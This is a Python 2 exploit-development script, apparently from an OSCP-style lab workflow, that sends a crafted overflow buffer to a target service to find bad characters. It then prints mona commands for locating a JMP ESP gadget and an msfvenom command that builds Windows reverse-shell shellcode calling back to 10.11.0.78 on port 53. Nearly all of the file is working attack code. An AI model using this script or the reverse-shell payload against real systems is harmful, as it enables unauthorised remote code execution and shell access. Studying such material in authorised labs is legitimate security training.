#!/usr/bin/env python2

import socket
from constants import *
import pyperclip


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))



# import badcharacter_test (valid bytes) from mona.py bytearray file
badchar_test = open(MONA_BYTEARRAY_FILE, 'rb').read()
# print ''.join('\\x{:02x}'.format(ord(x)) for x in data)



# build current list of badchars
badchars = []
for i in range(0x00, 0xFF+1):
    if chr(i) not in badchar_test:
        badchars += chr(i)



buf = ""
buf += "A"*(BUFFER_OFFSET - len(buf))
buf += "BBBB"
buf += badchar_test
buf += "D"*(BUFFER_TOTLEN - len(buf))
buf += "\r\n"

send_payload(s, buf)





print "\n\n\nSent: {0}".format(buf)
print "Look for the address on memory after BBBB - bad chars might start in the middle of address, so add 1-3 accordingly"
print "Replace ESP with ADDRESS_FROM_ABOVE if needed.."
print "\nRun mona compare to view current state of badchars. Update badchar bytearray and rerun this script."
cmd = "!mona compare -f %s -a ESP and !mona bytearray -b '%s'" % (MONA_BYTEARRAY_FILE, ''.join('\\x{:02x}'.format(ord(x)) for x in badchars))
pyperclip.copy(cmd)
print "Run in Immunity (copied to clipboard): %s" % cmd
print "\nMona will highlight bad char with 00 or -1 or b0 under it, also will list of corrupted characters  - sometimes initial list is inaccurate"
print "Then add bad character to the script and repeat until you get all chars back"

print "\n\nFor exploit:"
print "!mona jmp -r esp -cpb \"%s\"" % ''.join('\\x{:02x}'.format(ord(x)) for x in badchars)
print "msfvenom -p windows/shell_reverse_tcp -b '%s' -f python -v shellcode EXITFUNC=thread LHOST=10.11.0.78 LPORT=53 | sed 's/ b\"/ \"/g' | clip" % ''.join('\\x{:02x}'.format(ord(x)) for x in badchars)

